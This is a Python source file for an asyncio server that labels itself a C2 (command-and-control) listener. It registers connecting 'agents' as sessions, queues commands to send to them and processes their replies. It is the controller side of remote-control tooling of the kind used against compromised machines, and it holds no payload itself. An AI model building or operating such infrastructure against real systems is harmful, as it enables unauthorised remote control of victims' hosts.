import asyncio
from core.management.response_processor import ResponseProcessor
from core.management.session import Session
from core.management.session_manager import SessionManager
from core.server import async_comm


class AsyncServer:
    def __init__(self, address: str, session_manager: SessionManager):
        self.address = address
        self.session_manager = session_manager
        self.current_id = 1
        self._id_lock = asyncio.Lock()
        self.server = None

    async def _get_next_id(self) -> int:
        async with self._id_lock:
            sid = self.current_id
            self.current_id += 1
            return sid

    async def handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        client_addr = writer.get_extra_info('peername')
        addr_str = f"{client_addr[0]}:{client_addr[1]}" if client_addr else "Unknown"

        session_id = await self._get_next_id()

        command_queue = asyncio.Queue()

        session = Session(
            id=session_id,
            writer=writer,
            reader=reader,
            address=addr_str,
            status="active",
            command_queue=command_queue,
        )
        await self.session_manager.add_session(session)
        print(f"[+] New agent connected! ID: {session_id} Address: {addr_str}")

        async def read_worker():
            try:
                while True:
                    data = await async_comm.async_recv(reader)
                    if not data:
                        break
                    ResponseProcessor.process(data)
            except (ConnectionResetError, asyncio.IncompleteReadError):
                print(f"[-] Connection closed gracefully/unexpectedly by agent {session_id}")
            except Exception as e:
                print(f"[-] Read error in session {session_id}: {e}")

        async def write_worker():
            try:
                while True:
                    command = await command_queue.get()
                    header, enc = async_comm.length_prefixed_msg(command)
                    writer.write(header + enc)
                    await writer.drain()
                    print(f"[{session_id}] Command sent successfully.")
            except Exception as e:
                print(f"[-] Write error in session {session_id}: {e}")

        try:
            await asyncio.gather(read_worker(), write_worker())
        except Exception as e:
            print(f"[-] Session error {session_id}: {e}")
        finally:
            await self.session_manager.remove_session(session_id)
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
            print(f"[*] Session {session_id} cleaned up.")

    async def start(self):
        host, port = self.address.split(":")
        self.server = await asyncio.start_server(self.handle_client, host, int(port))
        print(f"[*] C2 Listener active on {self.address}")
        async with self.server:
            await self.server.serve_forever()

    async def stop(self):
        if self.server:
            self.server.close()
            await self.server.wait_closed()

        await self.session_manager.clear_all_sessions()
        print("[*] C2 Listener stopped.")
